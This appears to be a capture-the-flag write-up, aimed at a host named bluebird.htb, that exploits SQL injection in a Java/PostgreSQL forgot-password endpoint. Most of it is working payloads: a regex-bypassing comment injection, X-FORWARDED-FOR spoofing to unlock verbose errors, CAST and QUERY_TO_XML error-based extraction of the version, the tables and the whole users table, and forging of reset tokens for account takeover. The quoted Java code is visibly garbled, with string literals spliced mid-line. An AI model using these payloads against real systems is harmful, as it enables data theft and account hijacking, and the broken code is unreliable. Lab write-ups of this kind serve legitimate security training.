Let's take into example a Java code that rely on PostgreSQL as back-end Database. The specific */forgot* function is indeed vulnerable.

### AuthController.java (Lines 121-164)
```
@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletRequest request, HttpServletResponse response) throws IOException {
    if (email.isEmpty()) {
        response.sendRedirect("/forgot?e=Please+fill+out+all+fields");
        return null;
    } else {
        Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
        Matcher m = p.matcher(email);
        if (!m.matches()) {
        response.sendRedirect("/forgot?e=Invalid+email!");
        return null;
        } else {
        try {
            String sql = "SELECT * FROM users WHERE email = '" + email + "'";
            User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
            Long var10000 = user.getId();
            String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());ResetHash;
            logger.error("TODO- Send email w
            var10000 = user.getId();
            String passwordResetLink = "https://bluebird.htb/reset?uid=" + var10000 + "&code=" + passwordith link [" + passwordResetLink + "]");
            response.sendRedirect("/forgot?e=Please+check+your+email+for+the+password+reset+link");
            return null;
        } catch (EmptyResultDataAccessException var11) {
            response.sendRedirect("/forgot?e=Email+does+not+exist");
            return null;
        } catch (Exception var12) {
            String ipAddress = request.getHeader("X-FORWARDED-FOR");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }

            if (ipAddress.equals("127.0.1.1")) {
                model.addAttribute("errorMsg", var12.getMessage());
                model.addAttribute("errorStackTrace", Arrays.toString(var12.getStackTrace()));
            } else {
                model.addAttribute("errorMsg", "500 Internal Server Error");
                model.addAttribute("errorStackTrace", "Something happened on our side. Please try again later.");
            }

            return "error";
        }
        }
    }
}
```


1)Explanation here can we see that the regex only checks that the email is char@char.char
`Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");`

2)It checks if the client ip is loopback then it throws a verbose, but also allows to use the X-FORWARDED-FOR header to bypass the restriction of local addresses!
`String ipAddress = request.getHeader("X-FORWARDED-FOR");`
`if (ipAddress.equals("127.0.1.1"))`

3)Start easy by bypassing the regex with a comment as email format. This should bypass the wrong email structure error but no verbose applied since we need the specific header.
`' or 1=1--@bluebird.htb`

4)Use the (X-FORWARDED-FOR: 127.0.0.1) as header to get more verbose
`' or 1=1--@bluebird.htb`

5)Now we can start by getting the DB version. Do not forget the (X-FORWARDED-FOR: 127.0.0.1)
`' AND 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb`
(This will use cast string=int to parse int as a string. Naturally it will fail but the value will be parse into the error message)

6)Take even further by dumping a whole multi-line string as single one. 
Do not forget the (X-FORWARDED-FOR: 127.0.0.1)
`' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb`
(We need to use limit to only one value at time )

Or by using XML to dump the whole structure!
`';SELECT CAST(CAST(QUERY_TO_XML('SELECT table_name FROM information_schema.tables LIMIT 4',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb`

Response example:

```
BlueBird - Error
StatementCallback; SQL [SELECT * FROM users WHERE email = '';SELECT CAST(CAST(QUERY_TO_XML('SELECT table_name FROM information_schema.tables LIMIT 4',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb']; ERROR: invalid input syntax for type integer: "<row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <table_name>users</table_name>
</row>

<row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <table_name>posts</table_name>
</row>

<row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <table_name>pg_statistic</table_name>
</row>

<row xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <table_name>pg_type</table_name>
</row>

```

With this you can dump the whole user list(BASED ON THE EXAMPLE):
`';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM users',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb`

And having the UID and PASSHASH you can calculate the reset token... `TOKEN = MD5(UID:EMAIL:PASSHASH)`
And the reset link will be (https://bluebird.htb/reset?uid=UID&code=TOKEN):
https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56